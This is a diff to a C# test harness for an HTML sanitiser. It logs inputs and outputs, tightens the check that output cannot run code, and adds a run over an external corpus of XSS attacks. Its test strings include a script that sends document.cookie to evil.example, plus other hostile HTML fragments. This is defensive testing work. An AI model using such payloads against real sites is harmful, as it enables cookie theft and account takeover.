@@ -40,12 +40,26 @@ internal static partial class Program
     /// </summary>
     private static readonly string Control = Environment.GetEnvironmentVariable("CONTROL") ?? "";
 
-    private static Docs.Cleaned Clean(string? html) => Control switch
+    private static Docs.Cleaned Clean(string? html)
     {
-        "passthrough" => new Docs.Cleaned(html ?? "", []),
-        "empty" => new Docs.Cleaned("", ["everything"]),
-        _ => Docs.Clean(html),
-    };
+        var cleaned = Control switch
+        {
+            "passthrough" => new Docs.Cleaned(html ?? "", []),
+            "empty" => new Docs.Cleaned("", ["everything"]),
+            _ => Docs.Clean(html),
+        };
+        Seen.Add((Section, html ?? "", cleaned.Html));
+        return cleaned;
+    }
+
+    /// <summary>
+    /// Every input this run cleaned, with its output. DUMP=path writes them as
+    /// JSON for tests/docs-html/browser.mjs, which loads each OUTPUT in a real
+    /// browser — "cannot run" read from a string is a claim about text; a
+    /// browser is what decides (Mr. Singh, 30 Sept 2026).
+    /// </summary>
+    private static readonly List<(string Section, string Input, string Output)> Seen = [];
+    private static string Section = "page";
 
     private static void Ok(string what, bool ok, string detail = "")
     {
@@ -98,14 +112,29 @@ internal static partial class Program
     /// Independent of the sanitiser's own lists on purpose: the output holds
     /// only known elements, no attribute that runs code, no address outside
     /// http/https/mailto/our pictures, no CSS that fetches, no comment.
+    ///
+    /// The attribute and CSS checks look INSIDE TAGS only. Looking at the
+    /// whole string called four corpus outputs dangerous that were plain
+    /// words on the page — "' onmouseover=alert(1)" with nothing around it
+    /// is a sentence, not a handler (30 Sept 2026). Everything between "&lt;"
+    /// and "&gt;" is a tag: the sanitiser encodes both characters wherever
+    /// else they occur, which the first line here checks by finding every
+    /// "&lt;" followed by a name. This is still reading text; whether
+    /// anything RUNS is browser.mjs's to say.
     /// </summary>
-    private static bool Inert(string html) =>
-        Tags().Matches(html).All(m => MayAppear.Contains(m.Groups[1].Value))
-        && !RunningAttributes().IsMatch(html)
-        && !OtherAddresses().IsMatch(html)
-        && !html.Contains("url(", StringComparison.OrdinalIgnoreCase)
-        && !html.Contains("expression(", StringComparison.OrdinalIgnoreCase)
-        && !html.Contains("<!--");
+    private static bool Inert(string html)
+    {
+        var tags = string.Join("\n", InsideTags().Matches(html).Select(m => m.Value));
+        return Tags().Matches(html).All(m => MayAppear.Contains(m.Groups[1].Value))
+            && !RunningAttributes().IsMatch(tags)
+            && !OtherAddresses().IsMatch(tags)
+            && !tags.Contains("url(", StringComparison.OrdinalIgnoreCase)
+            && !tags.Contains("expression(", StringComparison.OrdinalIgnoreCase)
+            && !html.Contains("<!--");
+    }
+
+    [GeneratedRegex(@"<[^>]*>?")]
+    private static partial Regex InsideTags();
 
     private static int Main()
     {
@@ -142,6 +171,7 @@ internal static partial class Program
 
         // ---- 1. unknown elements -------------------------------------------
         Console.WriteLine("\n  1. Unknown elements");
+        Section = "unknown";
         Refuses("an element nobody knows", "<p>Fee <blink>50,000</blink></p>", "<blink");
         Ok("           …and its words stay", Run("<p>Fee <blink>50,000</blink></p>").Html == "<p>Fee 50,000</p>");
         Permits("the same sentence in a known element", "<p>Fee <strong>50,000</strong></p>");
@@ -157,6 +187,7 @@ internal static partial class Program
 
         // ---- 2. not a document ----------------------------------------------
         Console.WriteLine("\n  2. Content that is not a document");
+        Section = "not-a-document";
         Permits("nothing at all", "");
         Ok("permitted: null is an empty document", Clean(null).Html == "" && Clean(null).Dropped.Count == 0);
         Permits("plain words", "Just a sentence, no markup.");
@@ -182,6 +213,7 @@ internal static partial class Program
 
         // ---- 3. hostile HTML ---------------------------------------------------
         Console.WriteLine("\n  3. Raw hostile HTML");
+        Section = "hostile";
         Refuses("a script", "<p>Hi</p><script>fetch('https://evil.example/'+document.cookie)</script>", "<script", "fetch(", "evil.example");
         Refuses("a script in capitals, closed untidily", "<SCRIPT >go()</SCRIPT  ><p>After</p>", "script", "go()");
         Ok("           …and what follows it stays", Clean("<SCRIPT >go()</SCRIPT  ><p>After</p>").Html == "<p>After</p>");
@@ -244,6 +276,44 @@ internal static partial class Program
         var names = Run("<p on\"><script>=\"1\" data-x'y=\"2\">Hi</p><a\u0007b>x</a\u0007b>");
         Ok("names reported for the log hold only letters, digits, -, @, :, ? and spaces",
             names.Dropped.Count > 0 && names.Dropped.All(d => Regex.IsMatch(d, @"^[a-z0-9@:?\- ]{1,60}$")), string.Join(" | ", names.Dropped));
+
+        // ---- a corpus nobody here wrote ----------------------------------------
+        // Every entry of every file in corpus/ is one attack, written by other
+        // people for the purpose (corpus/README.md says whose, and the
+        // licence). A .txt file holds one a line; a .blocks.txt file holds
+        // attacks that span lines — a line break inside an address is itself
+        // an attack — separated by the line below. None has a permit twin:
+        // the twins are the sections above and the real editor's page. Text
+        // only here; browser.mjs runs them.
+        const string Separator = "-----8<-----";
+        var corpus = Path.Combine(AppContext.BaseDirectory, "corpus");
+        var files = Directory.Exists(corpus) ? Directory.GetFiles(corpus, "*.txt").Order().ToArray() : [];
+        Console.WriteLine("\n  4. A corpus nobody here wrote");
+        var attacks = 0;
+        foreach (var file in files)
+        {
+            Section = "corpus:" + Path.GetFileName(file).Split('.')[0];
+            var all = File.ReadAllText(file).Replace("\r\n", "\n");
+            var vectors = (file.EndsWith(".blocks.txt") ? all.Split("\n" + Separator + "\n") : all.Split('\n'))
+                .Where(v => v.Trim().Length > 0).ToArray();
+            attacks += vectors.Length;
+            var bad = vectors.Select((v, i) => (Entry: i + 1, Out: Clean(v).Html)).Where(x => !Inert(x.Out)).ToArray();
+            Ok($"{Path.GetFileName(file)}: {vectors.Length} attacks, none leaves anything that can run",
+                vectors.Length > 0 && bad.Length == 0,
+                string.Join("\n          ", bad.Take(5).Select(x => $"entry {x.Entry}: {x.Out}")));
+        }
+        Ok($"the corpus is there, and is several hundred attacks ({attacks})", attacks >= 300,
+            "tests/docs-html/corpus is missing or has been emptied");
+
+        if (Environment.GetEnvironmentVariable("DUMP") is { Length: > 0 } dump)
+        {
+            // The 8 MB and the 5,000-deep documents are about size, not
+            // execution, and would only slow the browser run.
+            var rows = Seen.Where(x => x.Input.Length < 100_000).Distinct()
+                .Select(x => new { section = x.Section, input = x.Input, output = x.Output }).ToArray();
+            File.WriteAllText(dump, System.Text.Json.JsonSerializer.Serialize(rows));
+            Console.WriteLine($"\n  wrote {rows.Length} input/output pairs to {dump}");
+        }
 
         Console.WriteLine();
         Console.WriteLine($"  {passed} passed, {failed} failed");
